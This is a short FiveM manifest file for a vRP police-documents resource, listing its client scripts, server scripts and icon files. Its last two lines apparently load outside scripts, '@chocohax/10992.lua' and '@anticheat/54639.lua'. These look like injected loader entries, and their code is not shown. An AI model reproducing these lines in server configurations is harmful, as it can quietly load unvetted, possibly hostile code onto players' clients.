fx_version {"adamant"}
games {"rdr3", "gta5"}

author "machiamavlad"
description "vRP Police Documents"

client_scripts {
	"@vrp/client/Tunnel.lua",
	"@vrp/client/Proxy.lua",
	"client.lua"
}

server_scripts {
	"@vrp/lib/utils.lua",
	"server.lua"

}

files {
	"icons/*.png"
}
client_script '@chocohax/10992.lua'
client_script '@anticheat/54639.lua'